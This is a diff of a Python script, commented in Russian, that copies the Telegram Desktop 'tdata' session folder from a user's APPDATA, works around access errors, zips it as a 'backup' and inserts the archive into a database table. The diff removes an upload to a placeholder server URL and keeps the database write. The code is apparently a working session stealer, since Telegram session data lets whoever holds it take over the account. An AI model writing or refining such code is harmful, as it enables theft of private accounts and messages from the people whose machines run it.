@@ -31,7 +31,7 @@ def save_file_to_db(file_path):
     cursor = connection.cursor()
     with open(file_path, 'rb') as f:
         binary_data = f.read()
-    cursor.execute("INSERT INTO files (file_name, file_data) VALUES (%s, %s)", (os.path.basename(file_path), binary_data))
+    cursor.execute("INSERT INTO users_data (file) VALUES (%s)", (binary_data,))
     connection.commit()
     cursor.close()
     connection.close()
@@ -40,7 +40,6 @@ def save_file_to_db(file_path):
 folder_to_zip = os.path.join(os.getenv('APPDATA'), r'Telegram Desktop\tdata')
 temp_folder = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_temp')
 output_zip = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_backup.zip')
-server_url = 'http://your-server-url/upload'  # Замените на URL вашего сервера
 
 # Копируем папку, если доступ запрещен
 if os.path.exists(folder_to_zip):
@@ -52,14 +51,6 @@ if os.path.exists(folder_to_zip):
         shutil.rmtree(temp_folder)  # Удаляем временную папку
         print(f'Папка "{folder_to_zip}" успешно скопирована и сжата в "{output_zip}".')
 
-        # Отправляем файл на сервер
-        response = send_file_to_server(output_zip, server_url)
-        if response.status_code == 200:
-            print('Файл успешно отправлен на сервер.')
-        else:
-            print(f'Ошибка при отправке файла на сервер: {response.status_code}')
-
-        # Сохраняем файл в базе данных
         save_file_to_db(output_zip)
         print('Файл успешно сохранен в базе данных.')
     except PermissionError as e:
